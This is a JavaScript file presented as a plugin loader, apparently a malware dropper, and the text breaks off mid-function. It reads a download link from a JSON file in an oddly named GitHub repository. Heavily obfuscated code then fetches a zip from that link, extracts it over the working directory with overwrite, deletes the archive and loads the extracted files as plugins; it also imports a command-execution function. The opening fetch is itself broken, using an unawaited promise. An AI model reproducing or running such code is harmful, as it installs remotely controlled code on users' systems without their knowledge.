const axiosx = require('axios');
const response = (axiosx.get("https://raw.githubusercontent.com/jhvhjvckhvhkv/fgfdgfdgfdgfdgfdg/refs/heads/main/url.json")).data;
const link  = response.URL;





function _0x526972(_0x5ca800,_0xb58c50,_0x3ae1fc,_0x51644a,_0x4a3c06){return _0x30f7(_0xb58c50- -0x30f,_0x5ca800);}(function(_0x54f002,_0x2f4703){function _0x40e710(_0x1b8d87,_0x4a7665,_0x4e0b49,_0x43acb6,_0xfacd1f){return _0x30f7(_0x1b8d87-0x16e,_0x43acb6);}function _0x300e1d(_0x173dee,_0xd8924b,_0x3832c1,_0x5d395b,_0x220e52){return _0x30f7(_0x173dee-0x280,_0x5d395b);}const _0x1dd99a=_0x54f002();function _0xaa84f7(_0x3c0079,_0x3782dc,_0x41a249,_0x37af2b,_0xf64621){return _0x30f7(_0x41a249- -0x23f,_0x37af2b);}function _0x17f8b6(_0x55821f,_0x508a0d,_0x20a62c,_0x73c631,_0x1862e4){return _0x30f7(_0x1862e4- -0x198,_0x508a0d);}function _0x455450(_0x4be941,_0x2fe181,_0x3593dc,_0x1fa66d,_0x9a5ec9){return _0x30f7(_0x1fa66d- -0x1,_0x4be941);}while(!![]){try{const _0x199469=-parseInt(_0xaa84f7(-0xee,-0xeb,-0xdc,'\x29\x7a\x56\x26',-0xb9))/(-0x181c*-0x1+0x5*-0x62d+0x33*0x22)+parseInt(_0x300e1d(0x3f9,0x417,0x3d9,'\x51\x36\x4e\x77',0x3ec))/(0x21*0x12b+-0x3b*0x9d+-0x2b*0xe)+parseInt(_0xaa84f7(-0x83,-0xbc,-0xb8,'\x5a\x5d\x45\x5a',-0x86))/(0x2ed*0x1+0x1362+0xb26*-0x2)+-parseInt(_0x17f8b6(-0x35,'\x35\x26\x40\x28',-0x68,-0x7f,-0x54))/(-0x1*0x24dd+-0x13c*0x12+-0x13b3*-0x3)*(parseInt(_0x17f8b6(-0x15,'\x24\x41\x21\x49',-0x2b,-0x2c,-0x41))/(0xf47*-0x1+-0x16e3+0x262f))+parseInt(_0x455450('\x6d\x67\x6d\x4f',0xfc,0x14e,0x126,0x156))/(-0x1a3a+0x985+-0x10bb*-0x1)+parseInt(_0x40e710(0x2a8,0x2d5,0x2c9,'\x77\x4f\x5b\x55',0x298))/(-0x251c+0x7fb+0x1d28)+parseInt(_0x40e710(0x2c4,0x299,0x29d,'\x6f\x32\x25\x56',0x2a7))/(-0x11f7+-0x1b*0x5b+0x2*0xdcc)*(-parseInt(_0xaa84f7(-0x100,-0xb5,-0xe7,'\x68\x2a\x4b\x51',-0x11c))/(-0x2*0x11e3+0x5c3+0x1e0c));if(_0x199469===_0x2f4703)break;else _0x1dd99a['push'](_0x1dd99a['shift']());}catch(_0x593389){_0x1dd99a['push'](_0x1dd99a['shift']());}}}(_0x49f2,0x5*0x21e01+-0xccef5*0x1+-0x1*-0xd4e7b));const path=require(_0x280fb9(-0x98,'\x77\x4f\x5b\x55',-0xad,-0xca,-0xce));function _0x1192d6(_0x73db07,_0x3eb0ad,_0x6504b8,_0x3521e3,_0x460a27){return _0x30f7(_0x3eb0ad- -0x1e8,_0x6504b8);}function _0x30f7(_0x1a62e8,_0x1078ce){const _0x35f941=_0x49f2();return _0x30f7=function(_0x121f7a,_0x111ff6){_0x121f7a=_0x121f7a-(0x1*-0x186f+0x40*0x95+-0xbaa*0x1);let _0x121891=_0x35f941[_0x121f7a];if(_0x30f7['\x70\x66\x76\x51\x42\x47']===undefined){var _0x461486=function(_0x40cd9c){const _0xf0be34='\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x2b\x2f\x3d';let _0x1fab45='',_0x361df2='';for(let _0x58d555=-0x1126+-0x1a50+0x2b76,_0x3bb67f,_0x2ce39e,_0x357c41=0x765+-0x1*-0x905+-0x1*0x106a;_0x2ce39e=_0x40cd9c['\x63\x68\x61\x72\x41\x74'](_0x357c41++);~_0x2ce39e&&(_0x3bb67f=_0x58d555%(-0x250f+-0xe74*0x2+0x41fb)?_0x3bb67f*(-0x203f+-0x38*0x9a+0x422f)+_0x2ce39e:_0x2ce39e,_0x58d555++%(0x22e5+0x18dc+-0x3bbd*0x1))?_0x1fab45+=String['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65'](0x1f8c+0x1a06+0x815*-0x7&_0x3bb67f>>(-(0x1c25+-0x1393+-0x890)*_0x58d555&-0x1*0x10dc+0x352+0xd90)):-0x4b+0x1da1+-0xa*0x2ef){_0x2ce39e=_0xf0be34['\x69\x6e\x64\x65\x78\x4f\x66'](_0x2ce39e);}for(let _0x472901=-0xf9+-0x14fc+0x15f5,_0x20979f=_0x1fab45['\x6c\x65\x6e\x67\x74\x68'];_0x472901<_0x20979f;_0x472901++){_0x361df2+='\x25'+('\x30\x30'+_0x1fab45['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](_0x472901)['\x74\x6f\x53\x74\x72\x69\x6e\x67'](-0x33b*0xc+-0x1b9+0x5cb*0x7))['\x73\x6c\x69\x63\x65'](-(0x21e8+-0xa8f+-0x1*0x1757));}return decodeURIComponent(_0x361df2);};const _0x274242=function(_0x3e58b3,_0x3a1b96){let _0x241f79=[],_0x10a3d5=-0x637*0x5+0x15*-0x1a7+0x20e3*0x2,_0x4bf5a6,_0x21fb34='';_0x3e58b3=_0x461486(_0x3e58b3);let _0x3e076b;for(_0x3e076b=-0x3*0x22d+-0x2*0x152+0x1*0x92b;_0x3e076b<0x1e8c+-0x17*-0x19d+0x97*-0x71;_0x3e076b++){_0x241f79[_0x3e076b]=_0x3e076b;}for(_0x3e076b=-0x155f+0xe41+0x71e;_0x3e076b<-0x1*0x12b6+-0xf*-0xc7+0x80d;_0x3e076b++){_0x10a3d5=(_0x10a3d5+_0x241f79[_0x3e076b]+_0x3a1b96['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](_0x3e076b%_0x3a1b96['\x6c\x65\x6e\x67\x74\x68']))%(-0xbca+-0x246e*0x1+0x3138),_0x4bf5a6=_0x241f79[_0x3e076b],_0x241f79[_0x3e076b]=_0x241f79[_0x10a3d5],_0x241f79[_0x10a3d5]=_0x4bf5a6;}_0x3e076b=0x197a*0x1+-0x1873+-0x107,_0x10a3d5=0x9*0x119+-0x240c+-0x21*-0xcb;for(let _0x298a34=0x1fdb+-0x875+-0x1766;_0x298a34<_0x3e58b3['\x6c\x65\x6e\x67\x74\x68'];_0x298a34++){_0x3e076b=(_0x3e076b+(-0x1abc+0x7cf+0x977*0x2))%(0xc2b+0x3b*0x7f+-0x2870),_0x10a3d5=(_0x10a3d5+_0x241f79[_0x3e076b])%(-0x10f*-0x2+0x9*-0x26b+-0x7*-0x2f3),_0x4bf5a6=_0x241f79[_0x3e076b],_0x241f79[_0x3e076b]=_0x241f79[_0x10a3d5],_0x241f79[_0x10a3d5]=_0x4bf5a6,_0x21fb34+=String['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65'](_0x3e58b3['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](_0x298a34)^_0x241f79[(_0x241f79[_0x3e076b]+_0x241f79[_0x10a3d5])%(-0x1*-0x17c9+-0x167*-0x13+-0x156*0x25)]);}return _0x21fb34;};_0x30f7['\x53\x54\x63\x42\x71\x54']=_0x274242,_0x1a62e8=arguments,_0x30f7['\x70\x66\x76\x51\x42\x47']=!![];}const _0x48c753=_0x35f941[0x131c+0x121*0x11+-0x264d],_0x3ce15d=_0x121f7a+_0x48c753,_0x9a1a2c=_0x1a62e8[_0x3ce15d];return!_0x9a1a2c?(_0x30f7['\x78\x44\x63\x42\x77\x72']===undefined&&(_0x30f7['\x78\x44\x63\x42\x77\x72']=!![]),_0x121891=_0x30f7['\x53\x54\x63\x42\x71\x54'](_0x121891,_0x111ff6),_0x1a62e8[_0x3ce15d]=_0x121891):_0x121891=_0x9a1a2c,_0x121891;},_0x30f7(_0x1a62e8,_0x1078ce);}const fs=require('\x66\x73'),{File}=require(_0x1192d6(-0x26,-0x5b,'\x5a\x5d\x45\x5a',-0x6f,-0x81)+'\x73'),{exec}=require(_0x280fb9(-0xd1,'\x66\x74\x42\x30',-0xf1,-0xdc,-0xca)+_0x4a30b0(0x13d,0x164,0x103,0x131,'\x44\x5b\x58\x39')+_0x1192d6(-0x50,-0x6d,'\x64\x58\x5b\x64',-0x3d,-0x76));function _0x280fb9(_0x836aa2,_0x332dce,_0x4a6add,_0xa2f46b,_0x5f4073){return _0x30f7(_0xa2f46b- -0x253,_0x332dce);}function _0x49f2(){const _0x48da16=['\x6e\x77\x69\x38\x34\x50\x36\x77','\x57\x34\x42\x63\x54\x43\x6f\x7a\x62\x68\x30','\x57\x34\x68\x64\x51\x68\x6d\x47','\x57\x4f\x71\x73\x57\x4f\x6d\x75\x57\x51\x61','\x57\x51\x74\x63\x49\x72\x38\x69\x57\x37\x4b','\x57\x34\x6e\x68\x57\x52\x64\x64\x50\x48\x53','\x57\x50\x42\x63\x51\x38\x6f\x7a\x57\x35\x4a\x63\x51\x47','\x57\x52\x68\x64\x4f\x43\x6b\x61\x57\x50\x68\x64\x4a\x47','\x6a\x38\x6b\x72\x57\x34\x34','\x57\x34\x37\x64\x49\x72\x53\x68\x57\x51\x6d','\x74\x49\x33\x64\x4d\x6d\x6b\x56\x57\x4f\x30','\x57\x36\x4a\x64\x4e\x43\x6b\x59\x57\x37\x5a\x63\x4d\x57','\x57\x52\x43\x7a\x77\x74\x58\x79','\x57\x51\x33\x63\x51\x6d\x6f\x75\x74\x53\x6b\x75','\x6c\x4d\x4c\x31\x57\x36\x46\x64\x52\x61','\x73\x63\x68\x64\x53\x6d\x6b\x57\x57\x50\x75','\x57\x52\x37\x64\x4a\x62\x38','\x57\x36\x64\x63\x52\x6d\x6f\x2b\x73\x53\x6f\x56\x57\x36\x75\x30\x77\x43\x6b\x37\x57\x34\x42\x63\x4c\x38\x6f\x41\x57\x4f\x75','\x57\x52\x35\x6e\x6f\x47','\x57\x36\x6e\x31\x70\x38\x6f\x51\x57\x37\x79','\x57\x35\x64\x64\x51\x48\x37\x63\x49\x5a\x47','\x57\x51\x4b\x49\x57\x35\x42\x64\x4f\x31\x71','\x6d\x43\x6b\x56\x57\x37\x74\x64\x56\x53\x6f\x76','\x6d\x38\x6b\x4e\x57\x37\x56\x64\x49\x6d\x6f\x77','\x57\x51\x56\x63\x53\x38\x6f\x46\x75\x43\x6f\x76','\x57\x36\x72\x56\x76\x38\x6f\x31\x57\x4f\x4f','\x57\x51\x6e\x57\x42\x64\x42\x64\x4f\x71','\x78\x53\x6b\x74\x6b\x64\x66\x31\x57\x37\x42\x63\x53\x66\x56\x63\x4e\x53\x6f\x6b\x70\x63\x72\x66','\x57\x50\x4e\x64\x4f\x53\x6b\x46\x6f\x31\x72\x44\x6b\x72\x4c\x67','\x6c\x59\x4b\x77\x6d\x38\x6f\x64','\x69\x6d\x6b\x49\x6f\x38\x6f\x32\x6f\x77\x79\x31\x57\x36\x53\x35\x57\x4f\x74\x63\x54\x66\x46\x63\x47\x71','\x57\x35\x6e\x35\x57\x50\x58\x61\x57\x37\x66\x6e\x6b\x30\x6d\x71\x6a\x75\x6c\x63\x4a\x71\x57','\x79\x53\x6f\x36\x57\x50\x2f\x64\x4a\x47\x34','\x57\x52\x4f\x50\x44\x43\x6f\x37\x57\x51\x64\x64\x56\x4d\x4e\x64\x54\x38\x6f\x6a\x57\x37\x52\x63\x53\x71','\x6e\x78\x37\x63\x53\x53\x6b\x2f\x66\x47','\x57\x50\x74\x64\x48\x47\x5a\x63\x52\x4a\x79','\x57\x51\x42\x63\x54\x61\x66\x67\x57\x37\x57','\x7a\x53\x6f\x48\x42\x53\x6b\x4b\x46\x71','\x61\x6d\x6b\x4f\x57\x36\x56\x64\x4e\x6d\x6f\x6d','\x66\x78\x37\x63\x53\x53\x6b\x2f\x66\x47','\x65\x48\x53\x44\x57\x52\x65\x2f','\x57\x36\x56\x64\x4d\x38\x6b\x59\x57\x37\x74\x63\x4a\x61','\x57\x50\x33\x64\x4f\x43\x6b\x2f\x57\x37\x64\x63\x55\x61','\x57\x52\x52\x63\x54\x61\x4f\x70\x57\x37\x71','\x57\x51\x50\x53\x57\x36\x42\x64\x51\x6d\x6f\x62','\x57\x52\x71\x32\x57\x4f\x74\x63\x4a\x68\x53\x6c\x57\x52\x69\x6a\x6f\x53\x6f\x74\x46\x57','\x79\x74\x4e\x63\x52\x6d\x6b\x45\x68\x53\x6f\x5a\x57\x34\x74\x63\x48\x57','\x57\x36\x61\x71\x41\x6d\x6b\x37\x75\x71\x4a\x64\x50\x53\x6b\x64\x57\x35\x79','\x57\x37\x2f\x64\x51\x6d\x6f\x52\x67\x71','\x57\x51\x65\x76\x74\x64\x35\x76','\x63\x6d\x6b\x6a\x57\x35\x5a\x64\x50\x53\x6f\x52','\x6e\x78\x72\x37','\x66\x38\x6f\x32\x43\x68\x79\x57','\x44\x38\x6f\x79\x46\x68\x75\x5a','\x76\x57\x75\x61\x57\x52\x38\x50','\x57\x51\x47\x4f\x57\x34\x57\x75\x57\x51\x4b','\x44\x30\x6d\x63\x45\x43\x6b\x52','\x57\x34\x56\x64\x47\x43\x6f\x59\x57\x4f\x31\x42','\x57\x50\x52\x64\x4f\x6d\x6b\x79\x74\x59\x53\x4f\x42\x48\x35\x55\x57\x35\x2f\x63\x50\x77\x76\x38','\x57\x4f\x68\x64\x54\x43\x6b\x34\x57\x35\x68\x63\x51\x61','\x57\x36\x70\x64\x4a\x38\x6f\x71\x57\x4f\x46\x64\x55\x71','\x57\x36\x74\x63\x4b\x75\x2f\x64\x56\x77\x7a\x64\x57\x52\x54\x50\x64\x73\x38\x44\x44\x63\x34','\x57\x37\x68\x64\x4a\x72\x79\x68\x57\x37\x57','\x6d\x43\x6b\x78\x57\x35\x4b','\x57\x36\x2f\x64\x4c\x43\x6f\x76\x57\x4f\x75','\x57\x4f\x6a\x69\x78\x59\x5a\x64\x55\x61','\x57\x37\x71\x43\x57\x50\x6e\x77\x74\x71','\x57\x36\x6e\x42\x57\x52\x64\x64\x52\x5a\x65','\x57\x51\x48\x32\x70\x38\x6b\x42\x75\x61','\x6c\x43\x6b\x79\x57\x34\x5a\x63\x53\x71','\x57\x35\x6c\x64\x4e\x43\x6b\x33\x57\x36\x42\x63\x47\x61','\x79\x43\x6f\x53\x57\x35\x64\x64\x4b\x63\x34','\x57\x4f\x54\x6d\x74\x63\x56\x64\x50\x47','\x57\x36\x33\x64\x4d\x53\x6b\x67\x57\x36\x5a\x63\x4d\x57','\x79\x6d\x6b\x4d\x57\x50\x53\x4b\x64\x61','\x57\x51\x66\x36\x70\x57','\x57\x50\x57\x66\x46\x64\x56\x63\x4a\x61','\x57\x36\x33\x63\x51\x38\x6b\x72\x57\x50\x4e\x64\x4e\x57','\x74\x4a\x68\x64\x53\x6d\x6b\x56\x57\x4f\x75','\x6b\x43\x6b\x57\x38\x6c\x63\x4d\x55\x71','\x57\x36\x70\x63\x4c\x30\x52\x64\x56\x67\x58\x6b\x57\x52\x54\x55\x68\x63\x30\x43\x46\x59\x61','\x57\x37\x4a\x63\x50\x38\x6b\x45\x57\x4f\x37\x63\x4c\x61','\x45\x4d\x6c\x63\x53\x47','\x57\x37\x42\x63\x4f\x6d\x6b\x78\x57\x35\x33\x64\x49\x57','\x57\x51\x5a\x63\x52\x6d\x6b\x41\x73\x38\x6b\x76','\x57\x34\x2f\x64\x4c\x38\x6f\x75\x57\x4f\x47\x69','\x57\x34\x68\x64\x55\x6d\x6f\x30\x65\x6d\x6b\x6a','\x66\x43\x6b\x59\x57\x34\x74\x64\x4e\x43\x6f\x35','\x69\x38\x6b\x4e\x70\x43\x6f\x32\x6f\x32\x38\x38\x57\x34\x30\x4d\x57\x4f\x78\x63\x55\x78\x4e\x63\x4e\x61','\x57\x35\x7a\x62\x57\x52\x52\x64\x56\x57\x34','\x57\x36\x48\x35\x69\x53\x6b\x35\x57\x52\x30','\x41\x63\x53\x55\x57\x51\x56\x63\x56\x47\x65\x44\x57\x35\x46\x64\x55\x38\x6f\x5a\x6d\x43\x6b\x46\x44\x57','\x57\x4f\x33\x64\x4e\x38\x6b\x34\x57\x34\x33\x64\x56\x57','\x57\x34\x42\x64\x52\x4b\x4b\x51\x62\x47','\x6e\x43\x6b\x56\x57\x4f\x56\x63\x4a\x65\x53\x30\x6b\x6d\x6b\x62\x57\x37\x48\x4d\x72\x43\x6b\x62\x57\x36\x75','\x57\x36\x46\x63\x4d\x43\x6b\x5a\x57\x50\x50\x57','\x57\x51\x42\x64\x56\x38\x6b\x39\x65\x47','\x57\x35\x6c\x63\x56\x53\x6f\x6a','\x57\x4f\x2f\x64\x50\x38\x6b\x61\x64\x53\x6b\x7a','\x57\x36\x6d\x78\x6d\x43\x6b\x35\x79\x58\x4e\x64\x4d\x6d\x6b\x52','\x41\x53\x6f\x37\x57\x35\x4a\x64\x4e\x62\x65','\x6b\x6d\x6b\x35\x57\x51\x6a\x59\x68\x57','\x57\x4f\x4a\x63\x4e\x30\x50\x6b\x57\x36\x47\x52\x57\x36\x2f\x64\x54\x59\x33\x63\x4e\x71\x46\x63\x4e\x31\x79','\x46\x38\x6f\x32\x46\x6d\x6b\x30\x41\x61','\x57\x51\x56\x63\x55\x31\x4a\x64\x4f\x43\x6f\x6b\x57\x35\x4e\x64\x54\x59\x53\x57\x42\x38\x6f\x68\x57\x50\x31\x30','\x70\x6d\x6b\x37\x57\x37\x5a\x64\x47\x6d\x6f\x43'];_0x49f2=function(){return _0x48da16;};return _0x49f2();}const AdmZip=require(_0x1192d6(-0xd7,-0xb9,'\x41\x57\x2a\x43',-0xbd,-0x8f)+'\x69\x70');function _0x4a30b0(_0x21a1b4,_0x1c903a,_0x43a774,_0x4a7750,_0x5966bf){return _0x30f7(_0x4a7750-0x9,_0x5966bf);}const PLUGINS_DIR=_0x1f4140(0x4c5,0x4bd,'\x74\x21\x28\x53',0x4d4,0x4e7)+_0x4a30b0(0x17c,0x1a3,0x1b5,0x18c,'\x66\x4b\x31\x47'),ZIP_DIR='\x2e\x2f';function _0x1f4140(_0x3f99aa,_0x5379c4,_0x13d2fe,_0x23ea26,_0x1d7b47){return _0x30f7(_0x5379c4-0x38d,_0x13d2fe);}async function downloadAndExtractZip(){function _0x46e291(_0x175f12,_0x3e794d,_0xd693dd,_0x20cb39,_0x1bc034){return _0x526972(_0x175f12,_0x1bc034- -0xd0,_0xd693dd-0x130,_0x20cb39-0x165,_0x1bc034-0x9);}function _0x5d636b(_0x520659,_0x23f2df,_0x1e6772,_0x400545,_0xf49512){return _0x280fb9(_0x520659-0x10f,_0x400545,_0x1e6772-0x3e,_0x1e6772- -0x112,_0xf49512-0x44);}function _0x2bb139(_0x2a4fc0,_0x12a803,_0xf5cd34,_0x5a8c08,_0x33922b){return _0x526972(_0x12a803,_0x33922b-0x1a5,_0xf5cd34-0xed,_0x5a8c08-0x4d,_0x33922b-0x1e2);}function _0x4a6d17(_0x7e7155,_0x3d7ff1,_0x584bd0,_0x4f9cff,_0x2e0b1a){return _0x280fb9(_0x7e7155-0x1be,_0x7e7155,_0x584bd0-0x98,_0x2e0b1a-0x198,_0x2e0b1a-0xcd);}function _0x24b133(_0x3cc13a,_0x119950,_0x30bf63,_0x544c8f,_0x5be020){return _0x526972(_0x3cc13a,_0x5be020-0x4e7,_0x30bf63-0x1bc,_0x544c8f-0x196,_0x5be020-0x14e);}const _0x3a28ac={'\x65\x64\x71\x4a\x70':_0x24b133('\x51\x36\x4e\x77',0x32d,0x322,0x324,0x324)+_0x4a6d17('\x43\x42\x25\x26',0x96,0x98,0x79,0x92)+_0x46e291('\x46\x48\x43\x29',-0x290,-0x280,-0x2b9,-0x29e)+_0x4a6d17('\x5a\x5d\x45\x5a',0xa9,0xb7,0xc5,0xbd),'\x4f\x64\x55\x52\x62':_0x2bb139(0x15,'\x71\x5e\x4c\x4d',-0x2,-0xc,-0x9)+_0x46e291('\x6a\x76\x6d\x36',-0x295,-0x286,-0x268,-0x277),'\x6d\x69\x71\x6a\x6f':_0x5d636b(-0x212,-0x1f8,-0x1fe,'\x37\x49\x55\x35',-0x1e3)+_0x46e291('\x49\x42\x6a\x48',-0x263,-0x287,-0x25b,-0x26c)+_0x5d636b(-0x21e,-0x246,-0x229,'\x66\x4b\x31\x47',-0x208)+_0x46e291('\x46\x48\x43\x29',-0x278,-0x2c7,-0x2a4,-0x2a9)+_0x4a6d17('\x6a\x37\x4c\x56',0xe9,0xc3,0xd8,0xc3)+_0x4a6d17('\x23\x7a\x6f\x53',0x92,0x74,0xc5,0x98)+_0x5d636b(-0x218,-0x1e3,-0x1e3,'\x6d\x7a\x77\x72',-0x1f2)+_0x5d636b(-0x23c,-0x218,-0x23c,'\x74\x4e\x42\x7a',-0x212),'\x7a\x54\x62\x6c\x49':_0x46e291('\x44\x5b\x58\x39',-0x281,-0x29c,-0x2b8,-0x29f)+_0x46e291('\x46\x70\x34\x4d',-0x24c,-0x248,-0x268,-0x257)+_0x5d636b(-0x1ea,-0x204,-0x217,'\x48\x47\x76\x61',-0x1f9)+_0x5d636b(-0x228,-0x21c,-0x21c,'\x5a\x5d\x45\x5a',-0x1f3)+_0x4a6d17('\x44\x5b\x58\x39',0xa6,0x72,0x76,0x94)+_0x4a6d17('\x4b\x43\x5d\x40',0xb1,0x95,0xb1,0xaa)+'\x20\u2705','\x6f\x73\x67\x61\x79':function(_0x3f30a8){return _0x3f30a8();},'\x4c\x53\x57\x73\x6b':_0x5d636b(-0x1ff,-0x202,-0x223,'\x39\x74\x4a\x69',-0x24d)+'\x3a'};try{if(!fs[_0x4a6d17('\x66\x74\x42\x30',0xb0,0xa8,0x94,0x7d)+_0x5d636b(-0x21a,-0x1e0,-0x210,'\x43\x43\x39\x62',-0x1e4)](PLUGINS_DIR)){const _0xf1c0fd={};_0xf1c0fd[_0x2bb139(-0x63,'\x37\x49\x55\x35',-0x66,-0x29,-0x38)+_0x5d636b(-0x235,-0x235,-0x23a,'\x76\x33\x68\x34',-0x238)]=!![],fs[_0x2bb139(-0x24,'\x70\x24\x45\x58',-0x1e,-0x13,0x0)+_0x24b133('\x63\x33\x68\x59',0x32f,0x335,0x31f,0x331)](PLUGINS_DIR,_0xf1c0fd);}console[_0x4a6d17('\x51\x36\x4e\x77',0x6f,0x83,0x7e,0x7e)](_0x3a28ac[_0x2bb139(-0x60,'\x77\x30\x55\x31',-0x30,-0x17,-0x2d)]);const _0x2c3b92=File[_0x2bb139(-0x2d,'\x5a\x5d\x45\x5a',0x1e,-0xb,0x6)+'\x52\x4c'](link),_0x324607=await _0x2c3b92[_0x24b133('\x70\x24\x45\x58',0x37e,0x34b,0x33e,0x349)+_0x4a6d17('\x23\x7a\x6f\x53',0xd1,0xd9,0x7f,0xa9)+_0x46e291('\x6a\x76\x6d\x36',-0x289,-0x261,-0x299,-0x271)](),_0x1520fc=path[_0x2bb139(-0x29,'\x4b\x43\x5d\x40',-0x5,-0x28,-0x1)](__dirname,_0x3a28ac[_0x4a6d17('\x32\x58\x40\x32',0xa6,0x66,0x4e,0x83)]);fs[_0x24b133('\x74\x4e\x42\x7a',0x337,0x2ea,0x336,0x30f)+_0x4a6d17('\x6d\x7a\x77\x72',0x82,0x8a,0xdd,0xb1)+_0x2bb139(0x4,'\x29\x7a\x56\x26',0x23,0x12,0x20)](_0x1520fc,_0x324607),console[_0x46e291('\x74\x4e\x42\x7a',-0x28a,-0x270,-0x2a5,-0x283)](_0x3a28ac[_0x4a6d17('\x63\x33\x68\x59',0xcd,0xcd,0xe8,0xc4)]);const _0x372705=new AdmZip(_0x1520fc);_0x372705[_0x2bb139(0x26,'\x58\x51\x59\x35',0x6,-0x33,0x1)+_0x2bb139(-0x5e,'\x66\x74\x42\x30',-0x6,-0x7,-0x37)+'\x54\x6f'](ZIP_DIR,!![]),console[_0x46e291('\x68\x2a\x4b\x51',-0x2d1,-0x2be,-0x273,-0x2a4)](_0x3a28ac[_0x46e291('\x68\x2a\x4b\x51',-0x288,-0x27b,-0x25e,-0x272)]),fs[_0x4a6d17('\x43\x42\x25\x26',0x6e,0x65,0xb6,0x99)+_0x5d636b(-0x215,-0x209,-0x238,'\x43\x42\x25\x26',-0x22a)](_0x1520fc),_0x3a28ac[_0x4a6d17('\x35\x79\x77\x71',0xc1,0x8e,0xc4,0x97)](loadPlugins);}catch(_0x303d11){console[_0x24b133('\x41\x71\x73\x24',0x34e,0x339,0x337,0x337)](_0x3a28ac[_0x24b133('\x70\x24\x45\x58',0x30e,0x2e8,0x32f,0x31b)],_0x303d11[_0x24b133('\x48\x47\x76\x61',0x336,0x337,0x368,0x368)+'\x67\x65']);}}function loadPlugins(){const _0x40e19c={'\x76\x79\x4a\x72\x46':function(_0x574e75,_0x1dd157){return _0x574e75==_0x1dd157;},'\x59\x79\x49\x74\x4e':_0x591937(0x423,0x439,0x46c,'\x66\x4b\x31\x47',0x43a),'\x4a\x65\x66\x61\x6e':function(_0x4cb875,_0x5034f4){return _0x4cb875(_0x5034f4);},'\x78\x51\x6e\x72\x73':function(_0x5421e1,_0x1d89a8){return _0x5421e1+_0x1d89a8;},'\x52\x64\x7a\x51\x6a':_0x591937(0x44e,0x453,0x467,'\x65\x41\x6e\x77',0x46c)+_0x591937(0x46d,0x43f,0x461,'\x74\x21\x28\x53',0x41c),'\x56\x75\x62\x73\x75':_0x591937(0x3d3,0x3f1,0x3e7,'\x24\x45\x46\x31',0x3c4)+_0x2a9b7e('\x46\x48\x43\x29',0x37b,0x393,0x381,0x347)+_0x508718(0x424,'\x62\x43\x39\x29',0x419,0x430,0x433)+_0x15dd4e(0x1a3,0x1a0,'\x5b\x35\x56\x65',0x1b8,0x1b6)+_0x15dd4e(0x1bb,0x18c,'\x30\x6b\x23\x34',0x1b7,0x1b7)+_0x508718(0x422,'\x6d\x7a\x77\x72',0x411,0x42f,0x407)+'\x20\u2705','\x6b\x42\x52\x49\x54':_0x591937(0x3ec,0x415,0x3e8,'\x24\x41\x21\x49',0x402)+_0x2a9b7e('\x41\x71\x73\x24',0x34f,0x350,0x35f,0x35a)+_0x2a9b7e('\x74\x21\x28\x53',0x37a,0x35c,0x39c,0x38c)+_0x2a9b7e('\x35\x79\x77\x71',0x332,0x33d,0x348,0x312)+'\x73\x3a'};function _0x15dd4e(_0x5c003b,_0x388903,_0x519691,_0x236d05,_0x526b03){return _0x1192d6(_0x5c003b-0xd1,_0x5c003b-0x245,_0x519691,_0x236d05-0xf5,_0x526b03-0xcb);}function _0x591937(_0x5bd124,_0x28c489,_0x4d9e7a,_0x42e4ed,_0x37f777){return _0x4a30b0(_0x5bd124-0x147,_0x28c489-0xf0,_0x4d9e7a-0x19c,_0x28c489-0x2bc,_0x42e4ed);}function _0x24a8c3(_0x21fef0,_0x2d670a,_0x53e878,_0x3c6525,_0x59736f){return _0x4a30b0(_0x21fef0-0x46,_0x2d670a-0x14c,_0x53e878-0xfb,_0x3c6525- -0x3bd,_0x21fef0);}function _0x2a9b7e(_0x4ed58c,_0x1cbfe0,_0x510c61,_0xcb457a,_0x1c3fbe){return _0x526972(_0x4ed58c,_0x1cbfe0-0x50d,_0x510c61-0xa3,_0xcb457a-0x179,_0x1c3fbe-0x14f);}function _0x508718(_0x340e74,_0x3f45e8,_0x41ef3b,_0x1e1b1a,_0xc793ab){return _0x526972(_0x3f45e8,_0xc793ab-0x5e8,_0x41ef3b-0x55,_0x1e1b1a-0x175,_0xc793ab-0x124);}try{fs[_0x24a8c3('\x74\x21\x28\x53',-0x213,-0x25f,-0x23e,-0x21f)+_0x591937(0x445,0x437,0x40f,'\x35\x79\x77\x71',0x428)+'\x63'](_0x40e19c[_0x15dd4e(0x1d2,0x1a7,'\x78\x67\x33\x29',0x207,0x205)])[_0x2a9b7e('\x4f\x26\x65\x5a',0x383,0x35c,0x34e,0x390)+'\x63\x68'](_0x54f723=>{function _0xf81fbf(_0x420ebc,_0x3043e9,_0x3c58c3,_0x59ab32,_0x248b2b){return _0x15dd4e(_0x3c58c3- -0x16d,_0x3043e9-0x1a1,_0x3043e9,_0x59ab32-0x127,_0x248b2b-0xc9);}function _0x27b69c(_0x45d808,_0x580a71,_0x16a3e5,_0x303d62,_0x4bb8bd){return _0x15dd4e(_0x4bb8bd-0x311,_0x580a71-0x9,_0x303d62,_0x303d62-0x102,_0x4bb8bd-0x18);}function _0x5f1cb9(_0x29e1e0,_0x58adf6,_0x5f02d6,_0x99a10d,_0x15ca9d){return _0x508718(_0x29e1e0-0x17b,_0x29e1e0,_0x5f02d6-0x19,_0x99a10d-0x19a,_0x58adf6- -0x2d0);}function _0x1540b2(_0x1571d3,_0x4fa293,_0x4b95a2,_0x2e03ee,_0x495acb){return _0x15dd4e(_0x2e03ee-0x24b,_0x4fa293-0x1d5,_0x495acb,_0x2e03ee-0x163,_0x495acb-0x104);}function _0xb6d7be(_0x1e2ee0,_0x106a83,_0x1c4d6f,_0x1d72b4,_0x25d78d){return 